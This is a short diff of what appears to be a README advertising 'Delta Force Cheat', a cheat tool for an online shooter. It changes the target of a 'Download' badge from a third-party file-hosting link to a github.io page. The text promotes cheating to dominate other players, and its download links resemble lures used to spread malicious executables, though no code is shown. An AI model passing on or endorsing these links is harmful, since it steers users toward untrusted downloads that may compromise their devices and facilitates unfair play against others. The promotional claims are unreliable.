@@ -12,4 +12,4 @@ Delta Force Cheat is a powerful tool that provides players with a variety of che
 
 Delta Force Cheat transforms the way you play, offering all the tools you need to break the game’s limits and dominate your opponents. Perfect for players who want to experiment with new features and gain an edge in every battle!
 
-[![Download DeltaForce Cheat](https://img.shields.io/badge/Download-DeltaForce%20Cheat-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download DeltaForce Cheat](https://img.shields.io/badge/Download-DeltaForce%20Cheat-blueviolet)](https://delta-force-cheat.github.io/.github/)
